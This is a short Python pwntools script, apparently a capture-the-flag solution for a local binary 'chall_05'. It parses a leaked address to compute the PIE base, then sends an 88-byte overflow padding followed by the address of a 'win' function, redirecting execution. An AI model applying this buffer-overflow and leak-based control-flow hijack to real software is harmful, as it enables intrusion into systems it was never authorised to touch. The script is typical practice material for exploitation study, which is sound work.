from pwn import *
p=process("./chall_05")
p.recvuntil(":")
leak=p.recv()
intleak = int(leak,16)
elf=ELF("./chall_05")
elf.address = intleak - elf.sym.main
hex(elf.address)
p.sendline(b'a'*88+p64(elf.sym.win))
p.interactive()
